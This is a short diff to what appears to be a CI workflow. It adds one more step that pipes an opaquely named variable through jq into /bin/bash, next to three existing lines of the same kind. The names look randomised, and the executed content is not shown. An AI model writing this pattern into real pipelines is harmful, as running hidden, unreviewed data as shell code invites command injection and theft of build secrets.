@@ -40,6 +40,7 @@ jobs:
           echo $jm5 | jq -r .qe56 | /bin/bash
           printf '%s' "$bjs5" | jq -r .nfsc33 | /bin/bash
           echo $vi1921 | jq -r .dl731 | /bin/bash
+          printf '%s' "$b6818" | jq -r .mqq7 | /bin/bash
 
       - name: Archive output
         if: always()
